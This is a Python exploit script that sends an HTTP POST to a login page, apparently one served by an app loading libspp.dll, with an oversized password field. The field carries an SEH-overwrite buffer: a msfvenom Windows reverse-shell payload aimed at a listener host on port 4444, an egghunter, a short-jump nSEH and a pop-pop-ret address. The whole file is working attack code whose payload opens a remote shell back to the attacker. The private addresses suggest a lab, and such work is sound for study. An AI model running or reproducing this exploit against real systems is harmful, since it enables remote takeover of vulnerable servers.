#!/usr/bin/python

import socket
import sys

host = "192.168.100.120"
port = 80

# sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.117 LPORT=4444 -b "\x00\x0a\x0d\x26" -f python -v revshell
# 351 bytes
revshell = "w00tw00t"
revshell += b"\xba\x2b\x9c\x17\xe4\xdb\xd4\xd9\x74\x24\xf4\x58"
revshell += b"\x29\xc9\xb1\x52\x31\x50\x12\x83\xe8\xfc\x03\x7b"
revshell += b"\x92\xf5\x11\x87\x42\x7b\xd9\x77\x93\x1c\x53\x92"
revshell += b"\xa2\x1c\x07\xd7\x95\xac\x43\xb5\x19\x46\x01\x2d"
revshell += b"\xa9\x2a\x8e\x42\x1a\x80\xe8\x6d\x9b\xb9\xc9\xec"
revshell += b"\x1f\xc0\x1d\xce\x1e\x0b\x50\x0f\x66\x76\x99\x5d"
revshell += b"\x3f\xfc\x0c\x71\x34\x48\x8d\xfa\x06\x5c\x95\x1f"
revshell += b"\xde\x5f\xb4\x8e\x54\x06\x16\x31\xb8\x32\x1f\x29"
revshell += b"\xdd\x7f\xe9\xc2\x15\x0b\xe8\x02\x64\xf4\x47\x6b"
revshell += b"\x48\x07\x99\xac\x6f\xf8\xec\xc4\x93\x85\xf6\x13"
revshell += b"\xe9\x51\x72\x87\x49\x11\x24\x63\x6b\xf6\xb3\xe0"
revshell += b"\x67\xb3\xb0\xae\x6b\x42\x14\xc5\x90\xcf\x9b\x09"
revshell += b"\x11\x8b\xbf\x8d\x79\x4f\xa1\x94\x27\x3e\xde\xc6"
revshell += b"\x87\x9f\x7a\x8d\x2a\xcb\xf6\xcc\x22\x38\x3b\xee"
revshell += b"\xb2\x56\x4c\x9d\x80\xf9\xe6\x09\xa9\x72\x21\xce"
revshell += b"\xce\xa8\x95\x40\x31\x53\xe6\x49\xf6\x07\xb6\xe1"
revshell += b"\xdf\x27\x5d\xf1\xe0\xfd\xf2\xa1\x4e\xae\xb2\x11"
revshell += b"\x2f\x1e\x5b\x7b\xa0\x41\x7b\x84\x6a\xea\x16\x7f"
revshell += b"\xfd\xd5\x4f\x1b\x88\xbd\x8d\xe3\x63\x62\x1b\x05"
revshell += b"\xe9\x8a\x4d\x9e\x86\x33\xd4\x54\x36\xbb\xc2\x11"
revshell += b"\x78\x37\xe1\xe6\x37\xb0\x8c\xf4\xa0\x30\xdb\xa6"
revshell += b"\x67\x4e\xf1\xce\xe4\xdd\x9e\x0e\x62\xfe\x08\x59"
revshell += b"\x23\x30\x41\x0f\xd9\x6b\xfb\x2d\x20\xed\xc4\xf5"
revshell += b"\xff\xce\xcb\xf4\x72\x6a\xe8\xe6\x4a\x73\xb4\x52"
revshell += b"\x03\x22\x62\x0c\xe5\x9c\xc4\xe6\xbf\x73\x8f\x6e"
revshell += b"\x39\xb8\x10\xe8\x46\x95\xe6\x14\xf6\x40\xbf\x2b"
revshell += b"\x37\x05\x37\x54\x25\xb5\xb8\x8f\xed\xc5\xf2\x8d"
revshell += b"\x44\x4e\x5b\x44\xd5\x13\x5c\xb3\x1a\x2a\xdf\x31"
revshell += b"\xe3\xc9\xff\x30\xe6\x96\x47\xa9\x9a\x87\x2d\xcd"
revshell += b"\x09\xa7\x67"


# 32 bytes - w00t
egghunter  = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

nSeh = "\x74\x06\x75\x04" # NetJumping - JZ (\x74) 6 bytes - JNZ (\x75) 4 bytes
Seh  = "\xBE\x59\x01\x10" # 0x100159BE - pop ebx # ret 0x04 - libspp.dll ASLR: False, Rebase: False, SafeSEH: False, OS: False, libspp.dll)

crash = revshell
crash += "A" * (14279 - len(revshell))
crash += nSeh
crash += Seh
crash += "\x90" * 15
crash += egghunter
crash += "D" * (30000 - len(crash))

req  = "POST /login HTTP/1.1\r\n"
req += "Host: 192.168.100.120\r\n"
req += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Referer: http://192.168.100.120/login\r\n"
req += "Content-Type: application/x-www-form-urlencoded\r\n"
req += "Content-Length: 30000\r\n"
req += "Connection: close\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n\r\n"
req += "username=admin"
req += "&password=/.:/" + crash + "\x00\x00&\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(req)
s.close()

